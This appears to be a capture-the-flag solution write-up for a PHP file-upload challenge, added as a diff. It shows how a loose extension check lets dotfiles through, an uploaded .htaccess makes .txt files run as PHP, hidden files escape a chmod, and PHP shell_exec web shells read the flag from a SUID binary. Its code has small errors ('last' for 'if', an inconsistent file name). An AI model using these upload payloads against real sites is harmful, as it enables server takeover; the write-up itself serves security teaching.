@@ -1,0 +1,80 @@
+solve
+
+step #1:
+
+// Get the extention by getting everyting past the last '.'
+last ($lastDotPosition == false) {
+    $filename = substr($target_file, 0, $lastDotPosition);
+    $extension = '';
+} else {
+    $filename = substr($target_file, 0, $lastDotPosition);
+    $extension = substr($target_file, $lastDotPosition + 1);
+}
+
+since there is a loose comparison (== instead of ===), this means if the last dot position is 0, this will evaluate to try and the extention will be empty. therefore, hidden files do not count as an extention
+
+--- 
+
+step #2:
+
+// Ensure that the extention is a txt file
+if ( $extension !== '' && $extension !== 'txt') {
+  echo "Sorry, only .txt extensions are allowed";
+  $uploadOk = 0;
+}
+
+as long as our file does not contian an extention, it can be uploaded. this includes .htaccess files. an .htaccess file can be uploaded that contains the following to allow txt files to execute as php:
+
+AddType application/x-httpd-php .txt
+
+---
+
+step #3:
+
+$old_path = getcwd();
+chdir($target_dir);
+// make unreadable - the proper way
+shell_exec('chmod -- 000 *');
+chdir($old_path);
+
+due to the -- in the chmod command, an attacker can not upload file such as --reference=file.txt. However, since they changed the .htaccess file to execute commands as php, they can upload a hidden file that will not get hit by the chmod --- 000 * command. this may be hard to notice, since the .htaccess is forbidden by default. .call_get_flag.txt can be uploaded containing the following:
+
+<?php
+echo(shell_exec('/var/www/html/get_flag 2>&1'));
+?>
+
+---
+
+step 4:
+
+An attacker needs to go into their cookies on the browser and grab PHPSESSID. Then they can navigate to the following URL (example PHPSESSID:2d752d3ac049dc9ae62192525ce8fc2c)
+
+after uploading the .htaccess file and .backdoor.txt, an attacker can navigate to the following:
+
+http://172.17.0.2/uploads/2d752d3ac049dc9ae62192525ce8fc2c/.call_get_flag.txt
+
+They will get this error:
+Error opening file: No such file or directory 
+
+---
+
+step 5:
+
+after reading the source file of get_flag.c, or downloading the file by navigating to http://172.17.0.2/get_flag and testing it, the attacker realizes they need to execute the SUID binary in the diretory /var/www/html since it is reading ./flag.txt, not /var/www/html/flag.txt. they can create another file and upload it named .call_get_flag_in_dir.txt:
+
+<?php
+chdir('/var/www/html');
+echo(shell_exec('./get_flag'));
+?>
+
+---
+
+step 6:
+
+after uploading the .htaccess file and .backdoor.txt, an attacker can navigate to the following:
+
+http://172.17.0.2/uploads/2d752d3ac049dc9ae62192525ce8fc2c/.call_get_flag_in_dir.txt
+
+and get the flag:
+
+wctf{m1ss3d_m3_chm0d_:3} 
